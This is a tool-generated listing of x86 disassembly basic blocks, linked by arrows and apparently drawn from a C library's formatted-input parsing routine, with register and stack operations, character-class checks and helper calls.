0xb04febd:	mov	dword ptr [ebp - 0x184], eax
0xb04fec3:	jmp	0xb04fdb3
None
|
|
|
v
0xb052ae2:	jmp	0xb04db90
None
|
|
|
v
0xb04fd17:	cmp	dword ptr [ebp - 0x14c], -1
0xb04fd1e:	je	0xb050be8
None
|
|
|
v
0xb04ef1e:	mov	eax, dword ptr [esi]
0xb04ef20:	jmp	0xb04d5e2
None
|
|
|
v
0xb050dc4:	mov	dword ptr [ebp - 0x188], 0xffffffff
0xb050dce:	jmp	0xb04db90
None
|
|
|
v
0xb04d8c3:	mov	dword ptr [ebp + 8], esi
0xb04d8c6:	mov	esi, dword ptr [ebp - 0x190]
0xb04d8cc:	lea	esi, dword ptr [esi]
0xb04d8d0:	add	edx, 1
0xb04d8d3:	lea	ecx, dword ptr [esi + esi*4]
0xb04d8d6:	lea	esi, dword ptr [eax + ecx*2 - 0x30]
0xb04d8da:	movzx	ecx, byte ptr [edx]
0xb04d8dd:	movzx	eax, cl
0xb04d8e0:	lea	edi, dword ptr [eax - 0x30]
0xb04d8e3:	cmp	edi, 9
0xb04d8e6:	jbe	0xb04d8d0
None
|
|
|
v
0xb04d701:	mov	eax, dword ptr [ebp - 0x180]
0xb04d707:	mov	dword ptr [ebp - 0x154], edi
0xb04d70d:	mov	edi, dword ptr [ebp - 0x158]
0xb04d713:	mov	edx, dword ptr [eax + 0x34]
0xb04d716:	mov	eax, dword ptr [ebp - 0x14c]
0xb04d71c:	test	byte ptr [edx + eax*2 + 1], 0x20
0xb04d721:	je	0xb04d747
None
|
|
|
v
0xb04ffed:	mov	eax, dword ptr [esi + 4]
0xb04fff0:	cmp	eax, dword ptr [esi + 8]
0xb04fff3:	jae	0xb053271
None
|
|
|
v
0xb05007c:	lea	edx, dword ptr [eax + 1]
0xb05007f:	mov	dword ptr [esi + 4], edx
0xb050082:	movzx	ecx, byte ptr [eax]
0xb050085:	mov	edx, dword ptr [ebp - 0x160]
0xb05008b:	add	edi, 1
0xb05008e:	movzx	eax, byte ptr [ebp - 0x154]
0xb050095:	cmp	byte ptr [edx + ecx], al
0xb050098:	jne	0xb05004d
None
|
|
|
v
0xb050230:	mov	byte ptr [edi + edx], 1
0xb050234:	mov	edx, dword ptr [ebp - 0x178]
0xb05023a:	mov	dword ptr [ebp + 8], esi
0xb05023d:	lea	ecx, dword ptr [edx + 1]
0xb050240:	movzx	eax, byte ptr [edx + 1]
0xb050244:	mov	dword ptr [ebp - 0x178], ecx
0xb05024a:	jmp	0xb04f150
None
|
|
|
v
0xb04dc50:	lock sub	dword ptr [edx], 1
None
|
|
|
v
0xb04dd28:	mov	edx, dword ptr [ebp - 0x194]
0xb04dd2e:	test	eax, eax
0xb04dd30:	mov	dword ptr [ebp - 0x150], eax
0xb04dd36:	mov	dword ptr [edx], eax
0xb04dd38:	jne	0xb04f099
None
|
|
|
v
0xb052b72:	jmp	0xb04d85b
None
|
|
|
v
0xb04d571:	mov	eax, dword ptr [esi + 0x68]
0xb04d574:	test	eax, eax
0xb04d576:	jne	0xb04d7f7
None
|
|
|
v
0xb04d73d:	add	edi, 1
0xb04d740:	test	byte ptr [edx + eax*2 + 1], 0x20
0xb04d745:	jne	0xb04d728
None
|
|
|
v
0xb04d734:	lea	ecx, dword ptr [eax + 1]
0xb04d737:	mov	dword ptr [esi + 4], ecx
0xb04d73a:	movzx	eax, byte ptr [eax]
0xb04d73d:	add	edi, 1
0xb04d740:	test	byte ptr [edx + eax*2 + 1], 0x20
0xb04d745:	jne	0xb04d728
None
|
|
|
v
0xb050ef3:	mov	ecx, dword ptr [ebp - 0x188]
0xb050ef9:	test	ecx, ecx
0xb050efb:	jne	0xb051069
None
|
|
|
v
0xb05116c:	mov	edi, dword ptr [ebp - 0x170]
0xb051172:	mov	eax, dword ptr [ebx - 0xdc]
0xb051178:	mov	dword ptr [edi + eax], 0x54
0xb05117f:	mov	edi, 4
0xb051184:	jmp	0xb04db90
None
|
|
|
v
0xb05011f:	add	dword ptr [ebp - 0x188], 1
0xb050126:	mov	dword ptr [ebp - 0x1a4], ecx
0xb05012c:	mov	dword ptr [ebp - 0x158], edi
0xb050132:	mov	dword ptr [ebp - 0x154], 0
0xb05013c:	mov	dword ptr [ebp - 0x194], 0
0xb050146:	jmp	0xb04d76f
None
|
|
|
v
0xb04fef8:	mov	eax, dword ptr [ebp - 0x184]
0xb04fefe:	test	eax, eax
0xb04ff00:	jne	0xb05116c
None
|
|
|
v
0xb0501dc:	test	eax, eax
0xb0501de:	je	0xb0501b8
None
|
|
|
v
0xb04daaa:	movzx	ecx, cl
0xb04daad:	mov	eax, dword ptr [ebx + ecx*4 - 0x50234]
0xb04dab4:	add	eax, ebx
0xb04dab6:	jmp	eax
None
|
|
|
v
0xb05089e:	mov	eax, dword ptr [ebp - 0x198]
0xb0508a4:	mov	ecx, dword ptr [eax]
0xb0508a6:	add	eax, 4
0xb0508a9:	mov	dword ptr [ebp - 0x198], eax
0xb0508af:	mov	dword ptr [ebp - 0x150], ecx
0xb0508b5:	mov	eax, dword ptr [ebp - 0x150]
0xb0508bb:	test	eax, eax
0xb0508bd:	jne	0xb04f0d1
None
|
|
|
v
0xb04ff06:	cmp	dword ptr [ebp - 0x158], edi
0xb04ff0c:	je	0xb0532bc
None
|
|
|
v
0xb04d818:	lea	edx, dword ptr [ebp - 0x144]
0xb04d81e:	mov	dword ptr [esp + 8], edx
0xb04d822:	mov	dword ptr [esp], edi
0xb04d825:	mov	dword ptr [esp + 4], eax
0xb04d829:	call	0xb096360
None
|
|
|
v
0xb0531e5:	mov	eax, dword ptr [ebp - 0x17c]
0xb0531eb:	and	eax, 0x2000
0xb0531f0:	cmp	eax, 1
0xb0531f3:	sbb	edi, edi
0xb0531f5:	and	edi, 2
0xb0531f8:	test	eax, eax
0xb0531fa:	mov	eax, 0xffffffff
0xb0531ff:	cmove	eax, dword ptr [ebp - 0x188]
0xb053206:	mov	dword ptr [ebp - 0x188], eax
0xb05320c:	jmp	0xb04db90
None
|
|
|
v
0xb04de3e:	mov	edi, edx
0xb04de40:	jmp	0xb04d95b
None
|
|
|
v
0xb04f187:	jae	0xb04f14d
None
|
|
|
v
0xb04da18:	cmp	eax, 0xff
0xb04da1b:	je	0xb050ece
None
|
|
|
v
0xb050be8:	mov	eax, dword ptr [ebx - 0xdc]
0xb050bee:	mov	edi, dword ptr [ebp - 0x170]
0xb050bf4:	mov	ecx, dword ptr [ebp - 0x174]
0xb050bfa:	mov	dword ptr [edi + eax], ecx
0xb050bfd:	mov	edx, dword ptr [ebp - 0x188]
0xb050c03:	test	edx, edx
0xb050c05:	jne	0xb051211
None
|
|
|
v
0xb04ffda:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb04dce9:	mov	edx, dword ptr [ebp - 0x190]
0xb04dcef:	test	edx, edx
0xb04dcf1:	jne	0xb05112b
None
|
|
|
v
0xb04dd98:	mov	eax, dword ptr [esi + 0x48]
0xb04dd9b:	mov	edx, dword ptr [esi + 0x48]
0xb04dd9e:	mov	dword ptr [eax + 8], edi
0xb04dda1:	add	dword ptr [edx + 4], 1
0xb04dda5:	jmp	0xb04d5ed
None
|
|
|
v
0xb053cd5:	mov	dword ptr [ebp - 0x14c], eax
0xb053cdb:	mov	ecx, dword ptr [ebx - 0xdc]
0xb053ce1:	mov	eax, dword ptr [ebp - 0x170]
0xb053ce7:	mov	eax, dword ptr [eax + ecx]
0xb053cea:	mov	dword ptr [ebp - 0x174], eax
0xb053cf0:	jmp	0xb0500b6
None
|
|
|
v
0xb04fb92:	jmp	0xb04db90
None
|
|
|
v
0xb04d728:	mov	eax, dword ptr [esi + 4]
0xb04d72b:	cmp	eax, dword ptr [esi + 8]
0xb04d72e:	jae	0xb050ee2
None
|
|
|
v
0xb053302:	mov	ecx, dword ptr [ebp - 0x194]
0xb053308:	mov	dword ptr [ecx], eax
0xb05330a:	add	eax, dword ptr [ebp - 0x168]
0xb053310:	mov	dword ptr [ebp - 0x150], eax
0xb053316:	jmp	0xb04fdb3
None
|
|
|
v
0xb051069:	mov	edi, 1
0xb05106e:	jmp	0xb04db90
None
|
|
|
v
0xb050e4d:	test	dword ptr [ebp - 0x17c], 0x2000
0xb050e57:	mov	esi, dword ptr [ebp + 8]
0xb050e5a:	jne	0xb050fe0
None
|
|
|
v
0xb04ff7e:	mov	dword ptr [ebp - 0x158], edi
0xb04ff84:	jmp	0xb04d765
None
|
|
|
v
0xb04ff12:	test	byte ptr [ebp - 0x17c], 8
0xb04ff19:	jne	0xb04ff7e
None
|
|
|
v
0xb050e60:	mov	eax, dword ptr [ebp - 0x194]
0xb050e66:	mov	edi, dword ptr [ebp - 0x19c]
0xb050e6c:	add	dword ptr [ebp - 0x188], 1
0xb050e73:	mov	eax, dword ptr [eax]
0xb050e75:	mov	dword ptr [ebp - 0x194], 0
0xb050e7f:	mov	byte ptr [eax + edi - 1], 0
0xb050e84:	mov	edi, 2
0xb050e89:	jmp	0xb04db90
None
|
|
|
v
0xb04d95b:	test	al, al
0xb04d95d:	je	0xb052b0e
None
|
|
|
v
0xb050d96:	mov	eax, 0xffffffff
0xb050d9b:	jmp	0xb04da39
None
|
|
|
v
0xb0532f4:	mov	edx, dword ptr [ebp - 0x150]
0xb0532fa:	test	eax, eax
0xb0532fc:	je	0xb05359c
None
|
|
|
v
0xb04d871:	cmp	edi, ecx
0xb04d873:	jne	0xb04d846
None
|
|
|
v
0xb050070:	mov	eax, dword ptr [esi + 4]
0xb050073:	cmp	eax, dword ptr [esi + 8]
0xb050076:	jae	0xb053cc2
None
|
|
|
v
0xb04f12f:	cmp	dl, 0x5d
0xb04f132:	movzx	eax, dl
0xb04f135:	je	0xb050230
None
|
|
|
v
0xb04d843:	lea	ecx, dword ptr [edi + eax]
0xb04d846:	mov	eax, dword ptr [esi + 4]
0xb04d849:	cmp	eax, dword ptr [esi + 8]
0xb04d84c:	jae	0xb052b55
None
|
|
|
v
0xb04dc5a:	mov	esi, dword ptr [ebp - 0x1b4]
0xb04dc60:	test	esi, esi
0xb04dc62:	je	0xb04dbaa
None
|
|
|
v
0xb053cca:	cmp	eax, 0xff
0xb053ccd:	mov	ecx, eax
0xb053ccf:	jne	0xb050085
None
|
|
|
v
0xb05463d:	lea	edx, dword ptr [eax + eax]
0xb054640:	jmp	0xb04d7b0
None
|
|
|
v
0xb0500a0:	movzx	eax, byte ptr [ebp - 0x14c]
0xb0500a7:	sub	edi, 1
0xb0500aa:	mov	dword ptr [esp], esi
0xb0500ad:	mov	dword ptr [esp + 4], eax
0xb0500b1:	call	0xb071270
None
|
|
|
v
0xb051211:	mov	edi, 1
0xb051216:	jmp	0xb04db90
None
|
|
|
v
0xb04f052:	mov	eax, dword ptr [ebp - 0x198]
0xb04f058:	mov	ecx, dword ptr [eax]
0xb04f05a:	add	eax, 4
0xb04f05d:	mov	dword ptr [ebp - 0x198], eax
0xb04f063:	mov	dword ptr [ebp - 0x194], ecx
0xb04f069:	mov	eax, dword ptr [ebp - 0x194]
0xb04f06f:	test	eax, eax
0xb04f071:	je	0xb0531db
None
|
|
|
v
0xb04fe19:	mov	edx, dword ptr [ebp - 0x168]
0xb04fe1f:	cmp	eax, 0xfe
0xb04fe22:	je	0xb04ff89
None
|
|
|
v
0xb04f17d:	movzx	esi, byte ptr [esi - 2]
0xb04f181:	mov	edx, esi
0xb04f183:	cmp	dl, cl
0xb04f185:	ja	0xb04f140
None
|
|
|
v
0xb053271:	mov	dword ptr [esp], esi
0xb053274:	call	0xb070a80
None
|
|
|
v
0xb04d759:	cmp	dword ptr [ebp - 0x14c], edi
0xb04d75f:	jne	0xb052aca
None
|
|
|
v
0xb04dc1c:	test	dword ptr [esi], 0x8000
0xb04dc22:	mov	dword ptr [ebp - 0x188], 0xffffffff
0xb04dc2c:	jne	0xb04db9c
None
|
|
|
v
0xb04f167:	cmp	al, 0x2d
0xb04f169:	jne	0xb04f140
None
|
|
|
v
0xb04eef5:	mov	edx, dword ptr [ebx - 0x60]
0xb04eefb:	mov	eax, dword ptr [ebx + 0x38b8]
0xb04ef01:	mov	dword ptr [esp + 8], esi
0xb04ef05:	ror	eax, 9
0xb04ef08:	xor	eax, dword ptr gs:[0x18]
0xb04ef0f:	mov	dword ptr [esp + 4], edx
0xb04ef13:	lea	edx, dword ptr [ebp - 0x134]
0xb04ef19:	mov	dword ptr [esp], edx
0xb04ef1c:	call	eax
None
|
|
|
v
0xb04db18:	movzx	ecx, al
0xb04db1b:	mov	esi, dword ptr [ebp + 8]
0xb04db1e:	mov	dword ptr [ebp - 0x17c], edi
0xb04db24:	lea	edi, dword ptr [ecx - 0x30]
0xb04db27:	cmp	edi, 9
0xb04db2a:	ja	0xb04fad8
None
|
|
|
v
0xb04d8e8:	mov	dword ptr [ebp - 0x190], esi
0xb04d8ee:	mov	esi, dword ptr [ebp + 8]
0xb04d8f1:	cmp	cl, 0x24
0xb04d8f4:	je	0xb04ee50
None
|
|
|
v
0xb04dae6:	movzx	eax, byte ptr [ecx]
0xb04dae9:	add	ecx, 1
0xb04daec:	cmp	al, 0x27
0xb04daee:	lea	edx, dword ptr [ecx - 1]
0xb04daf1:	jne	0xb04dad8
None
|
|
|
v
0xb04db5e:	mov	eax, dword ptr [ebx - 0xdc]
0xb04db64:	mov	edi, dword ptr [ebp - 0x170]
0xb04db6a:	mov	ecx, dword ptr [ebp - 0x174]
0xb04db70:	mov	dword ptr [edi + eax], ecx
0xb04db73:	mov	eax, dword ptr [ebp - 0x188]
0xb04db79:	mov	edi, 1
0xb04db7e:	test	eax, eax
0xb04db80:	jne	0xb04db90
None
|
|
|
v
0xb050850:	mov	eax, dword ptr [ebp - 0x190]
0xb050856:	test	eax, eax
0xb050858:	jne	0xb05194c
None
|
|
|
v
0xb04d6e1:	lea	edx, dword ptr [eax + 1]
0xb04d6e4:	mov	dword ptr [esi + 4], edx
0xb04d6e7:	movzx	eax, byte ptr [eax]
0xb04d6ea:	mov	dword ptr [ebp - 0x14c], eax
0xb04d6f0:	mov	eax, dword ptr [ebp - 0x154]
0xb04d6f6:	add	dword ptr [ebp - 0x158], 1
0xb04d6fd:	test	eax, eax
0xb04d6ff:	je	0xb04d759
None
|
|
|
v
0xb04d8d0:	add	edx, 1
0xb04d8d3:	lea	ecx, dword ptr [esi + esi*4]
0xb04d8d6:	lea	esi, dword ptr [eax + ecx*2 - 0x30]
0xb04d8da:	movzx	ecx, byte ptr [edx]
0xb04d8dd:	movzx	eax, cl
0xb04d8e0:	lea	edi, dword ptr [eax - 0x30]
0xb04d8e3:	cmp	edi, 9
0xb04d8e6:	jbe	0xb04d8d0
None
|
|
|
v
0xb0500b6:	cmp	dword ptr [ebp - 0x158], edi
0xb0500bc:	je	0xb0532c6
None
|
|
|
v
0xb04d91d:	mov	edi, dword ptr [ebp - 0x168]
0xb04d923:	mov	ecx, 0xffffffff
0xb04d928:	test	edi, edi
0xb04d92a:	cmovne	ecx, edi
0xb04d92d:	mov	dword ptr [ebp - 0x168], ecx
0xb04d933:	lea	ecx, dword ptr [eax - 0x4c]
0xb04d936:	cmp	cl, 0x2e
0xb04d939:	lea	edi, dword ptr [edx + 1]
0xb04d93c:	ja	0xb04de3e
None
|
|
|
v
0xb04d984:	and	eax, 0xffffffdf
0xb04d987:	cmp	al, 0x43
0xb04d989:	jne	0xb04ddaa
None
|
|
|
v
0xb04ffb0:	lea	eax, dword ptr [ebx - 0x4a6af]
0xb04ffb6:	mov	dword ptr [esp + 0xc], eax
0xb04ffba:	lea	eax, dword ptr [ebx - 0x4a6b9]
0xb04ffc0:	mov	dword ptr [esp + 4], eax
0xb04ffc4:	lea	eax, dword ptr [ebx - 0x45c70]
0xb04ffca:	mov	dword ptr [esp + 8], 0xa25
0xb04ffd2:	mov	dword ptr [esp], eax
0xb04ffd5:	call	0xb027820
None
|
|
|
v
0xb052b63:	mov	ecx, dword ptr [ebp - 0x14c]
0xb052b69:	cmp	eax, 0xff
0xb052b6c:	je	0xb04dc09
None
|
|
|
v
0xb050db1:	mov	ecx, dword ptr [ebp - 0x188]
0xb050db7:	mov	edi, 1
0xb050dbc:	test	ecx, ecx
0xb050dbe:	jne	0xb04db90
None
|
|
|
v
0xb04da81:	movzx	eax, al
0xb04da84:	mov	dword ptr [esp + 4], eax
0xb04da88:	mov	dword ptr [esp], esi
0xb04da8b:	sub	dword ptr [ebp - 0x158], 1
0xb04da92:	call	0xb071270
None
|
|
|
v
0xb05514b:	jmp	0xb04dd98
None
|
|
|
v
0xb04ff3c:	mov	eax, dword ptr [ebp - 0x194]
0xb04ff42:	mov	edx, ecx
0xb04ff44:	mov	eax, dword ptr [eax]
0xb04ff46:	sub	edx, eax
0xb04ff48:	mov	ecx, edx
0xb04ff4a:	sar	ecx, 2
0xb04ff4d:	cmp	ecx, dword ptr [ebp - 0x19c]
0xb04ff53:	je	0xb04ff6d
None
|
|
|
v
0xb050bc5:	mov	eax, dword ptr [ebp - 0x188]
0xb050bcb:	mov	edi, 1
0xb050bd0:	test	eax, eax
0xb050bd2:	jne	0xb04db90
None
|
|
|
v
0xb04d810:	mov	dword ptr [esp], edi
0xb04d813:	call	0xb07ae80
None
|
|
|
v
0xb04d5d0:	mov	edx, dword ptr [ebx - 0x60]
0xb04d5d6:	mov	dword ptr [ebp - 0x130], esi
0xb04d5dc:	mov	dword ptr [ebp - 0x134], edx
0xb04d5e2:	and	eax, 0x8000
0xb04d5e7:	je	0xb04dd70
None
|
|
|
v
0xb04ff89:	mov	ecx, dword ptr [ebx - 0x134]
0xb04ff8f:	mov	eax, dword ptr [ebp - 0x170]
0xb04ff95:	add	dword ptr [ebp - 0x184], 1
0xb04ff9c:	mov	eax, dword ptr [eax + ecx]
0xb04ff9f:	mov	ecx, dword ptr [ebp - 0x184]
0xb04ffa5:	mov	eax, dword ptr [eax]
0xb04ffa7:	cmp	ecx, dword ptr [eax + 0x58]
0xb04ffaa:	jb	0xb04fdbc
None
|
|
|
v
0xb04d97c:	cmp	al, 0x5b
0xb04d97e:	je	0xb04dcab
None
|
|
|
v
0xb04fda9:	mov	eax, dword ptr [ebp - 0x14c]
0xb04fdaf:	test	eax, eax
0xb04fdb1:	je	0xb04fde3
None
|
|
|
v
0xb04d7e7:	mov	dword ptr [esp + 4], 0xffffffff
0xb04d7ef:	mov	dword ptr [esp], esi
0xb04d7f2:	call	0xb066ae0
None
|
|
|
v
0xb04f108:	mov	edi, dword ptr [ebp - 0x160]
0xb04f10e:	xor	eax, eax
0xb04f110:	mov	ecx, 0x40
0xb04f115:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb04d798:	mov	eax, dword ptr [esi + 4]
0xb04d79b:	cmp	eax, dword ptr [esi + 8]
0xb04d79e:	jae	0xb0545f1
None
|
|
|
v
0xb050150:	mov	eax, dword ptr [ebp - 0x1a4]
0xb050156:	lea	edx, dword ptr [eax + 1]
0xb050159:	mov	byte ptr [eax], cl
0xb05015b:	mov	eax, dword ptr [ebp - 0x16c]
0xb050161:	test	eax, eax
0xb050163:	je	0xb050218
None
|
|
|
v
0xb04d98f:	mov	eax, dword ptr [ebp - 0x16c]
0xb04d995:	mov	dword ptr [ebp - 0x178], eax
0xb04d99b:	jmp	0xb04da97
None
|
|
|
v
0xb04ddaa:	cmp	byte ptr [ebp - 0x15c], 0x6e
0xb04ddb1:	jne	0xb04d9d7
None
|
|
|
v
0xb0532c6:	mov	edi, 2
0xb0532cb:	jmp	0xb04db90
None
|
|
|
v
0xb04da39:	mov	ecx, dword ptr [edx + 0x34]
0xb04da3c:	test	byte ptr [ecx + eax*2 + 1], 0x20
0xb04da41:	jne	0xb04da18
None
|
|
|
v
0xb04fb83:	movzx	eax, al
0xb04fb86:	mov	dword ptr [esp + 4], eax
0xb04fb8a:	mov	dword ptr [esp], esi
0xb04fb8d:	call	0xb071270
None
|
|
|
v
0xb0501b8:	mov	ecx, dword ptr [ebp - 0x184]
0xb0501be:	cmp	esi, ecx
0xb0501c0:	jbe	0xb050e4d
None
|
|
|
v
0xb04fdb3:	sub	edi, 1
0xb04fdb6:	je	0xb050c31
None
|
|
|
v
0xb050191:	mov	eax, dword ptr [ebp - 0x19c]
0xb050197:	mov	dword ptr [ebp + 8], esi
0xb05019a:	mov	edx, eax
0xb05019c:	add	eax, 1
0xb05019f:	add	edx, edx
0xb0501a1:	mov	dword ptr [ebp - 0x184], eax
0xb0501a7:	mov	esi, edx
0xb0501a9:	mov	eax, dword ptr [ebp - 0x14c]
0xb0501af:	mov	dword ptr [ebp - 0x14c], ecx
0xb0501b5:	jmp	0xb0501d0
None
|
|
|
v
0xb051e4c:	mov	eax, dword ptr [esi + edi*4 + 8]
0xb051e50:	mov	eax, dword ptr [eax]
0xb051e52:	mov	dword ptr [esp], eax
0xb051e55:	call	0xb017470
None
|
|
|
v
0xb04da21:	mov	eax, dword ptr [esi + 4]
0xb04da24:	cmp	eax, dword ptr [esi + 8]
0xb04da27:	jae	0xb050d5f
None
|
|
|
v
0xb04dd3e:	mov	eax, dword ptr [ebp - 0x17c]
0xb04dd44:	and	eax, 0x2000
0xb04dd49:	cmp	eax, 1
0xb04dd4c:	sbb	edi, edi
0xb04dd4e:	and	edi, 2
0xb04dd51:	test	eax, eax
0xb04dd53:	mov	eax, 0xffffffff
0xb04dd58:	cmove	eax, dword ptr [ebp - 0x188]
0xb04dd5f:	mov	dword ptr [ebp - 0x188], eax
0xb04dd65:	jmp	0xb04db90
None
|
|
|
v
0xb0508c3:	mov	edi, 2
0xb0508c8:	jmp	0xb04db90
None
|
|
|
v
0xb052d89:	mov	dword ptr [esp], esi
0xb052d8c:	call	0xb070a80
None
|
|
|
v
0xb05194c:	mov	edx, dword ptr [ebp - 0x190]
0xb051952:	mov	ecx, dword ptr [ebp + 0x10]
0xb051955:	cmp	edx, 1
0xb051958:	lea	eax, dword ptr [ecx + edx*4 - 4]
0xb05195c:	cmove	eax, ecx
0xb05195f:	mov	eax, dword ptr [eax]
0xb051961:	mov	dword ptr [ebp - 0x1a4], eax
0xb051967:	jmp	0xb050875
None
|
|
|
v
0xb04f115:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb05009a:	mov	dword ptr [ebp - 0x14c], ecx
0xb0500a0:	movzx	eax, byte ptr [ebp - 0x14c]
0xb0500a7:	sub	edi, 1
0xb0500aa:	mov	dword ptr [esp], esi
0xb0500ad:	mov	dword ptr [esp + 4], eax
0xb0500b1:	call	0xb071270
None
|
|
|
v
0xb051073:	mov	ecx, dword ptr [ebp - 0x180]
0xb051079:	mov	edx, dword ptr [ecx + 0x34]
0xb05107c:	jmp	0xb04d73d
None
|
|
|
v
0xb04dadc:	cmp	al, 0x49
0xb04dade:	jne	0xb04db18
None
|
|
|
v
0xb04fd93:	mov	ecx, dword ptr [ebp - 0x160]
0xb04fd99:	movzx	eax, byte ptr [ebp - 0x154]
0xb04fda0:	cmp	byte ptr [ecx + edx], al
0xb04fda3:	je	0xb050c42
None
|
|
|
v
0xb050890:	mov	eax, dword ptr [ebp - 0x190]
0xb050896:	test	eax, eax
0xb050898:	jne	0xb0511f1
None
|
|
|
v
0xb050bd8:	mov	dword ptr [ebp - 0x188], 0xffffffff
0xb050be2:	jmp	0xb04db90
None
|
|
|
v
0xb050ece:	mov	eax, dword ptr [ebp - 0x170]
0xb050ed4:	mov	ecx, dword ptr [ebp - 0x154]
0xb050eda:	mov	eax, dword ptr [eax + ecx]
0xb050edd:	jmp	0xb050d91
None
|
|
|
v
0xb04dd1c:	mov	dword ptr [esp], 0x190
0xb04dd23:	call	0xb0173f0
None
|
|
|
v
0xb053288:	jmp	0xb050008
None
|
|
|
v
0xb04d82e:	test	eax, eax
0xb04d830:	jle	0xb04dbec
None
|
|
|
v
0xb050eea:	cmp	eax, 0xff
0xb050eed:	jne	0xb051073
None
|
|
|
v
0xb04f034:	test	dword ptr [ebp - 0x17c], 0x2100
0xb04f03e:	je	0xb050850
None
|
|
|
v
0xb0508b5:	mov	eax, dword ptr [ebp - 0x150]
0xb0508bb:	test	eax, eax
0xb0508bd:	jne	0xb04f0d1
None
|
|
|
v
0xb0535f6:	xor	edi, edi
0xb0535f8:	mov	dword ptr [ebp - 0x188], 0xffffffff
0xb053602:	jmp	0xb04db90
None
|
|
|
v
0xb04ff1b:	mov	eax, dword ptr [ebp - 0x150]
0xb04ff21:	test	dword ptr [ebp - 0x17c], 0x2100
0xb04ff2b:	lea	ecx, dword ptr [eax + 4]
0xb04ff2e:	mov	dword ptr [ebp - 0x150], ecx
0xb04ff34:	mov	dword ptr [eax], 0
0xb04ff3a:	je	0xb04ff6d
None
|
|
|
v
0xb04f069:	mov	eax, dword ptr [ebp - 0x194]
0xb04f06f:	test	eax, eax
0xb04f071:	je	0xb0531db
None
|
|
|
v
0xb05005b:	sub	dword ptr [ebp - 0x168], 1
0xb050062:	mov	edx, dword ptr [ebp - 0x168]
0xb050068:	test	edx, edx
0xb05006a:	jle	0xb053cf5
None
|
|
|
v
0xb051e4a:	xor	edi, edi
0xb051e4c:	mov	eax, dword ptr [esi + edi*4 + 8]
0xb051e50:	mov	eax, dword ptr [eax]
0xb051e52:	mov	dword ptr [esp], eax
0xb051e55:	call	0xb017470
None
|
|
|
v
0xb04daec:	cmp	al, 0x27
0xb04daee:	lea	edx, dword ptr [ecx - 1]
0xb04daf1:	jne	0xb04dad8
None
|
|
|
v
0xb050d6d:	mov	edx, dword ptr [ebp - 0x14c]
0xb050d73:	cmp	eax, 0xff
0xb050d76:	jne	0xb04da36
None
|
|
|
v
0xb0531db:	mov	edi, 2
0xb0531e0:	jmp	0xb04db90
None
|
|
|
v
0xb04ff61:	test	eax, eax
0xb04ff63:	je	0xb04ff6d
None
|
|
|
v
0xb04dc98:	mov	eax, dword ptr [ebp - 0x160]
0xb04dc9e:	mov	dword ptr [esp], eax
0xb04dca1:	call	0xb017470
None
|
|
|
v
0xb04ff6d:	add	dword ptr [ebp - 0x188], 1
0xb04ff74:	mov	dword ptr [ebp - 0x194], 0
0xb04ff7e:	mov	dword ptr [ebp - 0x158], edi
0xb04ff84:	jmp	0xb04d765
None
|
|
|
v
0xb04d57c:	mov	dword ptr [esi + 0x68], 0xffffffff
0xb04d583:	mov	eax, dword ptr [esi]
0xb04d585:	mov	ecx, eax
0xb04d587:	and	ecx, 4
0xb04d58a:	jne	0xb050c98
None
|
|
|
v
0xb04efcb:	movzx	eax, al
0xb04efce:	mov	edi, 2
0xb04efd3:	mov	dword ptr [esp + 4], eax
0xb04efd7:	mov	dword ptr [esp], esi
0xb04efda:	call	0xb071270
None
|
|
|
v
0xb04dc54:	jne	0xb055138
None
|
|
|
v
0xb053cf5:	mov	dword ptr [ebp - 0x14c], ecx
0xb053cfb:	jmp	0xb0500b6
None
|
|
|
v
0xb050c0b:	mov	edi, 1
0xb050c10:	mov	dword ptr [ebp - 0x188], 0xffffffff
0xb050c1a:	jmp	0xb04db90
None
|
|
|
v
0xb052b39:	mov	dword ptr [esp], esi
0xb052b3c:	call	0xb070a80
None
|
|
|
v
0xb04f16b:	mov	esi, dword ptr [ebp - 0x178]
0xb04f171:	movzx	ecx, byte ptr [esi]
0xb04f174:	test	cl, cl
0xb04f176:	je	0xb04f140
None
|
|
|
v
0xb04dbb7:	mov	ecx, dword ptr [ebp + 0x14]
0xb04dbba:	test	ecx, ecx
0xb04dbbc:	je	0xb04dbc3
None
|
|
|
v
0xb04d888:	mov	dword ptr [ebp - 0x154], 1
0xb04d892:	jmp	0xb04d76f
None
|
|
|
v
0xb050008:	mov	eax, dword ptr [ebp - 0x158]
0xb05000e:	mov	ecx, dword ptr [ebp - 0x160]
0xb050014:	mov	edx, dword ptr [ebp - 0x14c]
0xb05001a:	lea	edi, dword ptr [eax + 1]
0xb05001d:	movzx	eax, byte ptr [ebp - 0x154]
0xb050024:	cmp	byte ptr [ecx + edx], al
0xb050027:	je	0xb0500a0
None
|
|
|
v
0xb050d91:	cmp	eax, 4
0xb050d94:	je	0xb050db1
None
|
|
|
v
0xb04d590:	mov	edx, dword ptr [ebp + 0xc]
0xb04d593:	test	edx, edx
0xb04d595:	je	0xb051b51
None
|
|
|
v
0xb04dd8e:	lock cmpxchg	dword ptr [edx], ecx
0xb04dd92:	jne	0xb055144
None
|
|
|
v
0xb04fd24:	mov	eax, dword ptr [esi + 4]
0xb04fd27:	cmp	eax, dword ptr [esi + 8]
0xb04fd2a:	jae	0xb052d89
None
|
|
|
v
0xb04d9d7:	mov	ecx, dword ptr [ebx - 0xdc]
0xb04d9dd:	mov	eax, dword ptr [ebp - 0x170]
0xb04d9e3:	mov	dword ptr [ebp - 0x184], edi
0xb04d9e9:	mov	edi, dword ptr [ebp - 0x158]
0xb04d9ef:	mov	dword ptr [ebp - 0x154], ecx
0xb04d9f5:	mov	edx, dword ptr [eax + ecx]
0xb04d9f8:	mov	dword ptr [eax + ecx], 0
0xb04d9ff:	mov	eax, dword ptr [ebp - 0x14c]
0xb04da05:	mov	dword ptr [ebp - 0x178], edx
0xb04da0b:	mov	edx, dword ptr [ebp - 0x180]
0xb04da11:	lea	esi, dword ptr [esi]
0xb04da18:	cmp	eax, 0xff
0xb04da1b:	je	0xb050ece
None
|
|
|
v
0xb04fdbc:	cmp	edx, 0xff
0xb04fdbf:	je	0xb04fed7
None
|
|
|
v
0xb050169:	mov	eax, dword ptr [ebp - 0x194]
0xb05016f:	mov	dword ptr [ebp - 0x1a4], edx
0xb050175:	mov	eax, dword ptr [eax]
0xb050177:	mov	dword ptr [ebp - 0x14c], eax
0xb05017d:	mov	eax, dword ptr [ebp - 0x19c]
0xb050183:	add	eax, dword ptr [ebp - 0x14c]
0xb050189:	cmp	edx, eax
0xb05018b:	jne	0xb05005b
None
|
|
|
v
